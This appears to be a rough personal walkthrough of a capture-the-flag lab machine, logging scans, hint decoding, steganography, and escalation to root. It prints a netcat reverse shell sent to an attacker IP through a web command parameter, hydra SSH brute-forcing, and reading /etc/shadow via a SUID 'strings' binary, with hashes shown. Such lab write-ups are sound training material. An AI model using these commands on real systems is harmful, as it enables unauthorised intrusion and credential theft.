
1. sudo nmap -sS -sV 10.10.188.42 -o nmap_jackofalltrades.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-23 11:27 IST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 11:27 (0:00:12 remaining)
Nmap scan report for 10.10.188.42
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


2.  nmap -sC -sV -A 10.10.188.42
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-23 11:36 IST
Nmap scan report for 10.10.188.42
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.61 seconds


3. now we will try nikto
nikto -h 10.10.188.42 -p 22 


Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.188.42
+ Target Hostname:    10.10.188.42
+ Target Port:        22
+ Start Time:         2023-02-23 12:26:35 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x645 0x59fbcc0a10780 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 

+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-02-23 12:44:51 (GMT5.5) (1096 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

4. now tried using curl to access the webserver:
curl 10.10.188.42:22

`<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
`

`
after decoding base64 got following:

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
NOTE: ??? cannot use this password !!!!!!! 

Another interesting point:

Note to self - If I ever get locked out I can get back in at /recovery.php!

now tried to access /recovery.php



curl 10.10.188.42:22/recovery.php
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->


```
curl -d "user=jack&param2= u?WtKSraq" -X POST http://10.10.188.42:22/recovery.php
```
5.
input user as jack and password as u?WtKSraq but nothing happens


NOTE:
in browser tried to access:
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= page
it returns http status code 403 - forbidden

6.
download header.jpg 
using steghide tried to extract data

steghide extract -sf header.jpg

got cms.creds

it contains following username and password:

Username: jackinthebox
Password: TplFxiSHjY

Is it ssh password?

let's try
NO result!!!!

7.
now try this username and password in /recovery.php
we landed a page :

http://10.10.171.81:22/nnxhweOV/index.php

it tells us :
GET me a 'cmd' and I'll run it for you Future-Jack.

So tried to run some cmd command:
http://10.10.171.81:22/nnxhweOV/index.php?cmd=cat%20/etc/passwd

got following:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false uuidd:x:104:109::/run/uuidd:/bin/false Debian-exim:x:105:110::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false statd:x:107:65534::/var/lib/nfs:/bin/false avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin jack:x:1000:1000:jack,,,:/home/jack:/bin/bash jack:x:1000:1000:jack,,,:/home/jack:/bin/bash


Now we will try to run a reverse shell:

http://10.10.126.208:22/nnxhweOV/index.php?cmd=nc%2010.18.1.224%204445%20-e%20/bin/bash

got a reverse shell. But logged in as www-data.

in the /home/directory found a file 

*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo

tried to crack it using john
but cannto crack it.
8. At this point got stucked. Took a help for this decryption only. It seems to be base32
, then convert it to hex, then rot17
 echo "GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S

9. Now tried to brute-force jack ssh using passwords found in his /home directory using hydra 
hydra -l  jack -P jack_passwords.txt 10.10.83.82 -s 80 -t 4 ssh

got the password!!!!
ITMJpGGIqg1jn?>@

10. now ssh as jack
ssh jack@target -p 80 
logged in as jack

11. in home directory of jack found user.jpg
to transfer user.jpg to attacker machine:

reciving end:
nc -l -p 4444 > user.jpg

Sending file:
nc -w 3 10.18.1.224 4444 < user.jpg

Download it using nc and get the user flag.
12.
Now going to escalate:

								(i) find / -perm -u=s -type f 2>/dev/null
								
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su

13.
using GTFOBINS found an exploit for strings with suid bit set. Using this binary we can read files which as root permissions (current user cannot access it)

Exploit and values of /etc/shadow

jack@jack-of-all-trades:~$ LFILE='/etc/shadow'
jack@jack-of-all-trades:~$ strings $LFILE
root:$6$b3.jqCVW$RhHJyUpN81dfuW6J..8rTYX..7msovXxtbwQX4w8SIqxTuGOGpuKVft.1Cw1yvpGiHh2LULov1EA5H2m33dPk/:18321:0:99999:7:::
daemon:*:16550:0:99999:7:::
bin:*:16550:0:99999:7:::
sys:*:16550:0:99999:7:::
sync:*:16550:0:99999:7:::
games:*:16550:0:99999:7:::
man:*:16550:0:99999:7:::
lp:*:16550:0:99999:7:::
mail:*:16550:0:99999:7:::
news:*:16550:0:99999:7:::
uucp:*:16550:0:99999:7:::
proxy:*:16550:0:99999:7:::
www-data:*:16550:0:99999:7:::
backup:*:16550:0:99999:7:::
list:*:16550:0:99999:7:::
irc:*:16550:0:99999:7:::
gnats:*:16550:0:99999:7:::
nobody:*:16550:0:99999:7:::
systemd-timesync:*:16550:0:99999:7:::
systemd-network:*:16550:0:99999:7:::
systemd-resolve:*:16550:0:99999:7:::
systemd-bus-proxy:*:16550:0:99999:7:::
uuidd:*:16550:0:99999:7:::
Debian-exim:!:16550:0:99999:7:::
messagebus:*:16550:0:99999:7:::
statd:*:16550:0:99999:7:::
avahi-autoipd:*:16550:0:99999:7:::
sshd:*:16550:0:99999:7:::
jack:$6$X4GueAFP$m2Ovdp1jLV3OX3B40CkxQd0LTk8l2vLr0UplPHA0gm1e5bzwWLRGyUwnU94TdfWzgRjmhLyXOcacx0SE5VshN1:18321:0:99999:7:::

Now we will exploit it using john

jack@jack-of-all-trades:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:104:109::/run/uuidd:/bin/false
Debian-exim:x:105:110::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash

14. 
Now trying to crack using john
1.
```
unshadow /etc/passwd /etc/shadow > output.db
```


2.john output.db
nothing found!!!!
15. 
as strings binary has SUID bit set, we can try to access /root/root/txt

string /root/root.txt
got root flag




